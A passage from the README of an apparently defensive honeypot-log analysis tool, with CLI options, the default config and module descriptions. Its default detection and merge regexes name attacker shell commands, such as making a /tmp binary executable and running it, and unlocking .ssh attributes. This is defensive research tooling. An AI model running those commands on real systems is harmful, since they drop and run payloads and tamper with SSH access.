  --standardize-regex-http-requests STANDARDIZE_REGEX_HTTP_REQUESTS [STANDARDIZE_REGEX_HTTP_REQUESTS ...]
                        Regexes to match in HTTP requests that should be standardized before hashing. All captured groups will be replaced with X before hashing. (default: [])

Merge Conditions:
  Conditions for merging attacks

  --merge-shared-attrs MERGE_SHARED_ATTRS [MERGE_SHARED_ATTRS ...]
                        Attributes to automatically merge attacks on when any are shared (default: ['src_ips', 'malware', 'cmdlog_ips', 'cmdlog_urls', 'malware_ips', 'malware_urls'])
  --merge-regex-commands MERGE_REGEX_COMMANDS [MERGE_REGEX_COMMANDS ...]
                        Regexes to match in commands of attacks that should be merged (default: [">\\??A@/ ?X'8ELFX", 'cat /proc/mounts; /bin/busybox [\\w\\d]+', 'cd /tmp && chmod \\+x [\\w\\d]+ && bash -c
                        ./[\\w\\d]+', 'cd ~; chattr -ia .ssh; lockr -ia .ssh'])
  --merge-regex-malware MERGE_REGEX_MALWARE [MERGE_REGEX_MALWARE ...]
                        Regexes to match in malware of attacks that should be merged (default: [])
  --merge-regex-http-requests MERGE_REGEX_HTTP_REQUESTS [MERGE_REGEX_HTTP_REQUESTS ...]
                        Regexes to match in HTTP requests of attacks that should be merged (default: ['GET /shell\\?cd\\+/tmp'])

Organizer Settings:
  Settings for organizing attacks into attack directories

  --organizer-overwrite, --no-organizer-overwrite, --overwrite, --no-overwrite
                        Whether or not to overwrite existing attack directories when organizing (default: True)
  --organizer-iterby ORGANIZER_ITERBY, --iterby ORGANIZER_ITERBY
                        How to iterate when organizing (logs or attacks) (default: logs)
  --organizer-concurrency-type ORGANIZER_CONCURRENCY_TYPE, --concurrency-type ORGANIZER_CONCURRENCY_TYPE
                        How to run organizing concurrently (processes or threads) (default: multiprocessing)
  --organizer-max-workers ORGANIZER_MAX_WORKERS, --max-workers ORGANIZER_MAX_WORKERS
                        Maximum number of workers (processes or threads) to use when organizing (default: None)
  --organizer-chunksize ORGANIZER_CHUNKSIZE, --chunksize ORGANIZER_CHUNKSIZE
                        Chunksize to use when organizing (default: 1)
  --organizer-yield-order ORGANIZER_YIELD_ORDER, --yield-order ORGANIZER_YIELD_ORDER
                        Order to yield results when organizing (as_completed or as_submitted) (default: as_completed)
  --organizer-ip-subdirs, --no-organizer-ip-subdirs, --ip-subdirs, --no-ip-subdirs
                        Whether or not to organize attacks into subdirectories by IP (default: False)

OpenAI Analyzer Settings:
  Settings for OpenAIAnalyzer

  --use-openai, --no-use-openai, --openai, --no-openai
                        Whether or not to run the OpenAIAnalyzer (default: True)
  --use-openai-code-interpreter, --no-use-openai-code-interpreter, --openai-code-interpreter, --no-openai-code-interpreter
                        Whether or not to use the OpenAI Code Interpreter (default: True)
  --openai-api-key OPENAI_API_KEY
                        OpenAI API Key (Get from https://platform.openai.com/api-keys) (default: <PASTE YOUR API KEY HERE>)
  --openai-model OPENAI_MODEL
                        OpenAI Model to use (Get from https://platform.openai.com/docs/models) (default: gpt-4-1106-preview)
  --openai-training-data-path OPENAI_TRAINING_DATA_PATH
                        Path to the openai-training-data directory (default: ./resources/openai-training-data)

IP Analyzer and Webdriver Settings:
  Settings for analyzing OSINT on IPs with IPAnalyzer and Selenium webdrivers

  --use-ipanalyzer, --no-use-ipanalyzer, --ipanalyzer, --no-ipanalyzer
                        Whether or not to run the IPAnalyzer (default: True)
  --ipanalyzer-sources IPANALYZER_SOURCES [IPANALYZER_SOURCES ...]
                        Sources to use for the IPAnalyzer (default: ['isc', 'whois', 'cybergordon', 'threatfox', 'shodan'])
  --ipanalyzer-max-errors IPANALYZER_MAX_ERRORS
                        Maximum number of errors allowed before a source is skipped (default: 5)
  --webdriver-path WEBDRIVER_PATH
                        Path to the webdriver executable for use with Selenium via SouperScraper (default: ./resources/chromedriver)
  --webdriver-type WEBDRIVER_TYPE
                        Type of webdriver executable for use with Selenium via SouperScraper (chrome, firefox, edge, safari, etc.) (default: chrome)

Malware Analyzer Settings:
  Settings for analyzing OSINT on malware samples with MalwareAnalyzer

  --use-malwareanalyzer, --no-use-malwareanalyzer, --malwareanalyzer, --no-malwareanalyzer
                        Whether or not to run the MalwareAnalyzer (default: True)
  --malwareanalyzer-sources MALWAREANALYZER_SOURCES [MALWAREANALYZER_SOURCES ...]
                        Sources to use for the MalwareAnalyzer (default: ['exploitdb', 'malpedia', 'malwarebazaar', 'threatfox', 'urlhaus'])
  --malwareanalyzer-max-errors MALWAREANALYZER_MAX_ERRORS
                        Maximum number of errors allowed before a source is skipped (default: 5)
  --malwareanalyzer-allow-downloads, --no-malwareanalyzer-allow-downloads
                        Weather or not to malware analyzer to attempt to download failed malware samples from Urlhaus (default: False)

User and Honeypot Environment Settings:
  Settings specific to the user and honeypot environment

  --user-ips USER_IPS [USER_IPS ...]
                        IPs that belong to the user to be excluded from analysis (default: [])
  --honeypot-external-ips HONEYPOT_EXTERNAL_IPS [HONEYPOT_EXTERNAL_IPS ...]
                        External IPs of the honeypot system(s) to inform AI for more accurate analysis (default: [])
  --honeypot-internal-ips HONEYPOT_INTERNAL_IPS [HONEYPOT_INTERNAL_IPS ...]
                        Interal IPs of the honeypot system(s) to inform AI for more accurate analysis (default: [])
  --honeypot-ports HONEYPOT_PORTS [HONEYPOT_PORTS ...]
                        Open ports of on honeypot system(s) to inform AI for more accurate analysis (default: [22, 23, 80, 2222, 2223, 2323, 5555, 7547, 8000, 8080, 9000])
  --honeypot-software HONEYPOT_SOFTWARE [HONEYPOT_SOFTWARE ...]
                        Version strings of the software running on each open port of the honeypot system(s) to inform AI for more accurate analysis. (default: ['Cowrie SSH server running OpenSSH 6.0p1 Debian
                        4+deb7u2 (protocol 2.0)', 'Cowrie Telnet server', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Cowrie SSH server running OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)',
                        'Cowrie Telnet server', 'Cowrie Telnet server', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Web server
                        running Apache httpd 3.2.3 and WordPress 5.6.7', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7'])

Input Paths:
  Paths to input logs and files

  --logs-path LOGS_PATH
                        Path to the logs directory (default: ./logs)
  --cowrie-logs-path COWRIE_LOGS_PATH
                        Path to the cowrie logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/cowrie)
  --firewall-logs-path FIREWALL_LOGS_PATH
                        Path to the firewall logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/firewall)
  --web-logs-path WEB_LOGS_PATH
                        Path to the web logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/web)
  --malware-downloads-path MALWARE_DOWNLOADS_PATH
                        Path to the malware downloads directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/malware/downloads)
  --auth-random-path AUTH_RANDOM_PATH
                        Path to the auth_random.json file (Should be a subdirectory of LOGS_PATH) (default: ./logs/auth_random.json)
  --resources-path RESOURCES_PATH
                        Path to the resources directory (default: ./resources)

Output Paths:
  Paths to output files and directories

  --attacks-path ATTACKS_PATH
                        Path to the attacks directory where Attack data will be stored and loaded from (default: ./attacks)
  --db-path DB_PATH     Path to the db directory where IP, Malware, and OpenAI data will be stored and loaded from (default: ./db)
  --ipdb-path IPDB_PATH
                        Path to the ipdb directory where IP data will be stored and loaded from (Should be a subdirectory of DB_PATH) (default: ./db/ipdb)
  --mwdb-path MWDB_PATH
                        Path to the mwdb directory where Malware data will be stored and loaded from (Should be a subdirectory of DB_PATH) (default: ./db/mwdb)
  --aidb-path AIDB_PATH
                        Path to the aidb directory where OpenAI data will be stored and loaded from (Should be a subdirectory of DB_PATH) (default: ./db/aidb)
  --reports-path REPORTS_PATH
                        Path to the reports directory where attack markdown reports and files will be exported too (default: ./reports)

```
> For more advanced usage see comments in the source code and/or edit DEFAULT_CONFIG in [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/main.py).

</details>

---


<details>
<summary>
<h2>Default Config</h2>
</summary>


```python
{'SORT_ATTRS': ['num_source_ips',
                'num_sessions',
                'num_commands',
                'num_malware',
                'num_http_requests'],
 'SORT_ORDER': 'desc',
 'LOAD_ATTACKS_MAX_WORKERS': 2,
 'LOG_TYPES': ['cowrie', 'zeek'],
 'ZEEK_LOG_TYPES': ['http'],
 'ZEEK_LOG_EXT': '.log',
 'ZEEK_KEEP_EMPTY_FIELDS': True,
 'ZEEK_KEEP_UNSET_FIELDS': False,
 'ATTACK_MIN_COMMANDS': 1,
 'ATTACK_MIN_MALWARE': 1,
 'ATTACK_MIN_SUCCESSFUL_LOGINS': 1,
 'ATTACK_MIN_HTTP_REQUESTS': 1,
 'ATTACK_HTTP_URI_REGEXES': ['(\\||\\$|\\`|;|\\-\\-|\\{|\\}|\\[|\\]|\\(|\\)|<|>|\\\\|\\^|\\~|\\!|\\$?\\{?IFS\\}?|\\.\\/)'],
 'ATTACK_HTTP_ANYWHERE_REGEXES': ['(\\||\\$|\\`|\\{|\\}|<|>|\\\\[^n]|\\^|\\!|\\$?\\{?IFS\\}?|\\.\\/)'],
 'STANDARDIZE_REGEX_COMMANDS': ['/bin/busybox (\\w+)',
                                '/tmp/([\\w\\d]+)',
                                '/tmp/[\\w\\d]+ ([\\w/\\+]+)',
                                '(\\d+\\.\\d+\\.\\d+\\.\\d+[:/]\\d+)'],
 'STANDARDIZE_REGEX_MALWARE': ['C0755 4745 (\\S+)'],
 'STANDARDIZE_REGEX_HTTP_REQUESTS': [],
 'MERGE_SHARED_ATTRS': ['src_ips',
                        'malware',
                        'cmdlog_ips',
                        'cmdlog_urls',
                        'malware_ips',
                        'malware_urls'],
 'MERGE_REGEX_COMMANDS': [">\\??A@/ ?X'8ELFX",
                          'cat /proc/mounts; /bin/busybox [\\w\\d]+',
                          'cd /tmp && chmod \\+x [\\w\\d]+ && bash -c '
                          './[\\w\\d]+',
                          'cd ~; chattr -ia .ssh; lockr -ia .ssh'],
 'MERGE_REGEX_MALWARE': [],
 'MERGE_REGEX_HTTP_REQUESTS': ['GET /shell\\?cd\\+/tmp'],
 'ORGANIZER_OVERWRITE': True,
 'ORGANIZER_ITERBY': 'logs',
 'ORGANIZER_CONCURRENCY_TYPE': 'multiprocessing',
 'ORGANIZER_MAX_WORKERS': None,
 'ORGANIZER_CHUNKSIZE': 1,
 'ORGANIZER_YIELD_ORDER': 'as_completed',
 'ORGANIZER_IP_SUBDIRS': False,
 'USE_OPENAI': True,
 'USE_OPENAI_CODE_INTERPRETER': True,
 'OPENAI_API_KEY': '<PASTE YOUR API KEY HERE>',
 'OPENAI_MODEL': 'gpt-4-1106-preview',
 'OPENAI_TRAINING_DATA_PATH': './resources/openai-training-data',
 'USE_IPANALYZER': True,
 'IPANALYZER_SOURCES': ['isc', 'whois', 'cybergordon', 'threatfox', 'shodan'],
 'IPANALYZER_MAX_ERRORS': 5,
 'WEBDRIVER_PATH': './resources/chromedriver',
 'WEBDRIVER_TYPE': 'chrome',
 'USE_MALWAREANALYZER': True,
 'MALWAREANALYZER_SOURCES': ['exploitdb',
                             'malpedia',
                             'malwarebazaar',
                             'threatfox',
                             'urlhaus'],
 'MALWAREANALYZER_MAX_ERRORS': 5,
 'MALWAREANALYZER_ALLOW_DOWNLOADS': False,
 'USER_IPS': [],
 'HONEYPOT_EXTERNAL_IPS': [],
 'HONEYPOT_INTERNAL_IPS': [],
 'HONEYPOT_PORTS': [22, 23, 80, 2222, 2223, 2323, 5555, 7547, 8000, 8080, 9000],
 'HONEYPOT_SOFTWARE': ['Cowrie SSH server running OpenSSH 6.0p1 Debian '
                       '4+deb7u2 (protocol 2.0)',
                       'Cowrie Telnet server',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Cowrie SSH server running OpenSSH 6.0p1 Debian '
                       '4+deb7u2 (protocol 2.0)',
                       'Cowrie Telnet server',
                       'Cowrie Telnet server',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7'],
 'LOGS_PATH': './logs',
 'COWRIE_LOGS_PATH': './logs/cowrie',
 'FIREWALL_LOGS_PATH': './logs/firewall',
 'WEB_LOGS_PATH': './logs/web',
 'ZEEK_LOGS_PATH': './logs/zeek',
 'MALWARE_DOWNLOADS_PATH': './logs/malware/downloads',
 'AUTH_RANDOM_PATH': './logs/auth_random.json',
 'RESOURCES_PATH': './resources',
 'ATTACKS_PATH': './attacks',
 'DB_PATH': './db',
 'IPDB_PATH': './db/ipdb',
 'MWDB_PATH': './db/mwdb',
 'AIDB_PATH': './db/aidb',
 'REPORTS_PATH': './reports'}

```

</details>

---


<details>
<summary>
<h2>Module Descriptions</h2>
</summary>


#### [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/main.py)
> Main script for initializing and running all analyzer objects according to command line arguments and config file

#### [attackanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/attackanalyzer.py)
> High level class for running OSINTAnalyzers and OpenAIAnalyzer on Attack objects after being created by the LogProcessor

#### [analyzerbase](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase)
> Base classes, utility functions, libraries, and constants for all analyzer modules

| Script | Description |
| --- | --- |
| [common.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/common.py) | Imports and constants used by all analyzer modules |
| [baseobjects.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/baseobjects.py) | Custom base classes for all objects. CachePropertyObject allows temporary caching of properties for faster processing while remaining dynamic. SmartAttrObject allows properties to be called with modifiers like uniq_ and num_ |
| [attack.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/attack.py) | Attack object for storing all data related to a single attack. Constructed by LogProcessor and modified by OSINTAnalyzers and OpenAIAnalyzers |
| [malware.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/malware.py) | Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object |
| [session.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/session.py) | Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object |
| [sourceip.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/sourceip.py) | SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object |
| [util.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/util.py) | Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text |

#### [loganalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers)
> Scripts for analyzing logs to create Attack objects, organizing and reading Attack directories

| Script | Description |
| --- | --- |
| [logparser.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logparser.py) | Classes for reading all logs into Python objects with standardized keys |
| [logprocessor.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logprocessor.py) | Processes logs into Attack objects by creating SourceIP, Session, and Malware objects and adding them to an Attack object when specified conditions are met. |
| [attackdirorganizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirorganizer.py) | Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading |
| [attackdirreader.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirreader.py) | Reads and counts log events in Attack directories organized by attackdirorganizer |

#### [openaianalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers)
> Scripts for analyzing Attack objects using OpenAI's Completions and Assistant APIs

| Script | Description |
| --- | --- |
| [aibase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/aibase.py) | Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost |
| [completions.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/completions.py) | OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code |
| [assistant.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/assistant.py) | OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about an Attack object and its subobjects |
| [tools.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/tools.py) | Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects |

#### [osintanalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers)
> Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object

| Script | Description |
| --- | --- |
| [osintbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/osintbase.py) | Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer |
| [ipanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/ipanalyzer.py) | IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois |
| [malwareanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/malwareanalyzer.py) | MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, Malpedia, and Explot-DB |
| [soupscraper.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/soupscraper.py) | SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects |

#### [markdownwriters](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters)
> Scripts for writing markdown files from Attack objects

| Script | Description |
| --- | --- |
| [markdownwriterbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/markdownwriterbase.py) | Base class for all markdown writers and markdown shortcut functions |
| [attackmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/attackmarkdownwriter.py) | Markdown writer for Attack objects following ISC format |
| [ipmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/ipmarkdownwriter.py) | Markdown writer for ipdata added to Attack objects by IPAnalyzer |
| [runstepsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/runstepsmarkdownwriter.py) | Markdown writer for AI RunSteps for questions asked by the OpenAIAssistantAnalyzer when processed by the AttackAnalyzer and when in interactive mode |
| [docsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/docsmarkdownwriter.py) | Markdown writer for the honeypot-ai project documentation and README |
| [visualizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/visualizer.py) | Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts']. (Not currently used due to crowding) |

#### [setup.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup.sh)
> Setup script for installing the honeypot-ai project

#### [setup](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup)
> Scripts for setting up the honeypot-ai project

| Script | Description |
| --- | --- |
| [requirements.txt](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/requirements.txt) | List of all required packages for the honeypot-ai project |
| [getchromedrier.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/getchromedrier.py) | Utility script to download correct chromedriver for Selenium |
| [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh) | Utility script to sync logs from honeypot to honeypot-ai project logs directory |
| [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh) | Utility script to install Zeek on a remote honeypot |

</details>

---

